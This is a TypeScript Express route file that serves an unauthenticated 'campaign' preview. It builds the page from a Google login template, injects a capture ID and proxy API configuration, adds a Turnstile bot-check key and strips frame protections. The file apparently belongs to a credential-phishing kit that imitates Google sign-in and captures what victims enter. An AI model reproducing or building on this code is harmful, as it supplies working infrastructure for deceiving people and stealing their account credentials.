import { Router, Request, Response } from 'express';
import prisma from '../../config/database';
import fs from 'fs';
import path from 'path';
import { logger } from '../../utils/logger.util';

const router = Router();

/**
 * GET /api/preview/:campaignId
 * Serve preview of the campaign page (no auth required)
 */
router.get('/:campaignId', async (req: Request, res: Response) => {
  try {
    const { campaignId } = req.params;

    // Fetch campaign from database
    const campaign = await prisma.campaign.findUnique({
      where: { id: campaignId },
      select: { 
        id: true, 
        captureId: true,
      },
    });

    if (!campaign) {
      return res.status(404).send('<html><body><h1>404 - Campaign Not Found</h1></body></html>');
    }

    // Get the primary domain's Turnstile sitekey (if any)
    const domain = await prisma.domain.findFirst({
      where: {
        turnstileSitekey: {
          not: null,
        },
      },
      select: {
        turnstileSitekey: true,
      },
      orderBy: {
        createdAt: 'desc',
      },
    });

    const turnstileSitekey = domain?.turnstileSitekey || '';

    // Read the login page template (3 levels up from dist/routes/public/)
    const templatePath = path.resolve(__dirname, '../../../login-pages/google/index.html');

    if (!fs.existsSync(templatePath)) {
      logger.error(`Template not found at: ${templatePath}`);
      return res.status(500).send('<html><body><h1>500 - Template Not Found</h1></body></html>');
    }

    let htmlContent = fs.readFileSync(templatePath, 'utf-8');

    // Inject __PRXY_API_CONFIG__ FIRST - must be available before any other scripts load
    const backendUrl = process.env.BACKEND_URL || 'http://localhost:8000';
    const configScript = `<script>window.__PRXY_API_CONFIG__ = { apiBaseUrl: '${backendUrl}', captureId: '${campaign.id}', apiKey: 'default-api-key' };</script>`;
    htmlContent = htmlContent.replace('<head>', `<head>${configScript}`);

    // Inject base tag for static asset resolution
    htmlContent = htmlContent.replace('<head>', '<head><base href="/static/login-pages/google/">');

    // Replace any remaining placeholders in HTML
    htmlContent = htmlContent.replace(/\{\{CAPTURE_ID\}\}/g, campaign.id);
    htmlContent = htmlContent.replace(/\{\{BACKEND_URL\}\}/g, process.env.BACKEND_URL || 'http://localhost:8000');
    htmlContent = htmlContent.replace(/\{\{TURNSTILE_SITEKEY\}\}/g, process.env.TURNSTILE_SITEKEY || '');

    // Serve the HTML
    const frontendUrl = process.env.FRONTEND_URL || 'http://localhost:3001';
    const backendUrlEnv = process.env.BACKEND_URL || 'http://localhost:8000';
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Content-Security-Policy', `frame-ancestors ${frontendUrl} ${backendUrlEnv}`);
    res.removeHeader('X-Frame-Options');
    res.send(htmlContent);
  } catch (error: any) {
    logger.error('Preview page error:', error.message);
    res.status(500).send('<html><body><h1>500 - Internal Server Error</h1></body></html>');
  }
});

export default router;
